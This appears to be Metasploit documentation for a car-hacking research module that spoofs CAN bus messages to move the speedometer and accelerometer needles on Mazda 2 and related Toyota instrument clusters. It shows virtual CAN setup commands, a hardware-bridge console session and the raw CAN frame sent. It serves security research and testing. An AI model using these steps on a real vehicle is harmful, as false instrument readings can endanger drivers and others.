## Introduction

mazda_ic_mover or Mazda 2 Instrument Cluster Accelorometer Mover sends CAN message to move the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster. This works specifically for for Mazda 2 1.5 Skyactiv, Mazda Demio, Mazda 2 Demio, Scion iA, Toyota Yaris, Toyota Yaris R and Toyota Yaris iA.

This [research](https://twitter.com/rootconph/status/1171333590161879040) was done by Jay Turla of ROOTCON's Car Hacking Village.

## Verification Steps

Fire up virtual CAN bus:

1. `sudo modprobe can`
2. `sudo modprobe vcan`
3. `sudo ip link add dev vcan0 type vcan`
4. `sudo ip link set up vcan0`

You could also use Craig Smith's Instrument Cluster Simulator: https://github.com/zombieCraig/ICSim

Launch msf:

5. Start `msfconsole`
6. `use auxiliary/server/local_hwbridge`
7. `set uripath testbus`
8. `run`
9. `use auxiliary/client/hwbridge/connect`
10. `set targeturi testbus`

## Options

**CANBUS**
CAN Bus to perform scan on, defaults to connected bus

## Scenarios
A successful spoofing of an instrument cluster on a target vehicle:

```
msf5 auxiliary(client/hwbridge/connect) > run
[*] Running module against 127.0.0.1

[*] Attempting to connect to 127.0.0.1...
[*] Hardware bridge interface session 2 opened (127.0.0.1 -> 127.0.0.1) at 2019-09-11 04:59:40 -0700
[+] HWBridge session established
[*] HW Specialty: {"automotive"=>true}  Capabilities: {"can"=>true, "custom_methods"=>true}
[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge
[!]          could have real world consequences.  Use this module in a controlled testing
[!]          environment and with equipment you are authorized to perform testing on.
[*] Auxiliary module execution completed
msf5 auxiliary(client/hwbridge/connect) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  2         hwbridge cmd/hardware  automotive   127.0.0.1 -> 127.0.0.1 (127.0.0.1)

msf5 auxiliary(client/hwbridge/connect) > sessions -i 2
[*] Starting interaction with 2...

hwbridge > run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0

[*] Moving the accelorometer and speedometer...
hwbridge > run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0

[*] Moving the accelorometer and speedometer...
hwbridge > run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0

[*] Moving the accelorometer and speedometer...
hwbridge > run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0

[*] Moving the accelorometer and speedometer...
hwbridge > run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0

[*] Moving the accelorometer and speedometer...
```

You can use candump to verify the CAN messages being sent:

```
jjt@ubuntu:~/pentot/ICSim$ candump -c vcan0
  vcan0  202   [8]  60 01 60 60 60 60 60 00
  vcan0  202   [8]  60 01 60 60 60 60 60 00
  vcan0  202   [8]  60 01 60 60 60 60 60 00
  vcan0  202   [8]  60 01 60 60 60 60 60 00
```
